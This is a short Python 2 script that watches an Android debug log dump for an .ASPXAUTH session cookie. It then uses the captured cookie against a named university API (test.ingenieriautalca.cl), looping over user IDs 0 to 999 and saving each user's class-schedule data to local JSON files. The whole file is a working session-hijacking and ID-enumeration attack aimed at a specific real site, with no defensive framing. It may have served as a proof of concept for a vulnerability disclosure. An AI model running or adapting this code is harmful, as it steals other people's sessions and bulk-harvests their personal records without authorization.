import requests
import json
import re
import time

def check_string(w, filename):
    with open(filename) as f:
        found = False
        for line in f:
            if re.search("{0}".format(w),line):
                return line
        return False

cookie_found = False
cookie = ""

print "Now I will start searching on adb_dump.log for any cookies available. As soon as I grab one I'll start crawling. "
while not cookie_found:
    r = check_string(".ASPXAUTH", "adb_dump.log")
    if not r:
        time.sleep(1)
    else:
        cookie = r
        cookie_found = True

cookie_string = re.search('.ASPXAUTH=(.+?);', cookie).group(1)
print "Session cookie found: " + cookie_string

login_url   = "http://test.ingenieriautalca.cl/api/CuentaApi/Ingresar"
classes_url = "http://test.ingenieriautalca.cl/api/CursoApi/ProximasClases"
headers = {
    'content-type': "application/json",
    'cache-control': "no-cache"
}
cookie = {
    ".ASPXAUTH" : cookie_string
}

for id in range(0,1000):
    payload = {"ID": id}
    r = requests.post(classes_url, cookies=cookie, json=payload, headers=headers)
    if r.text != "[]":
        # print "USER= " + str(id) + ", DATA= " + r.text
        text_file = open("results/"+str(id)+".json", "w")
        text_file.write(json.dumps(json.loads(r.text.encode('utf-8').strip()), indent=4, sort_keys=True))
        text_file.close()
    # else:
        # print "USER= " + str(id) + ", DATA= NOT FOUND"

print "Scanning finished!"
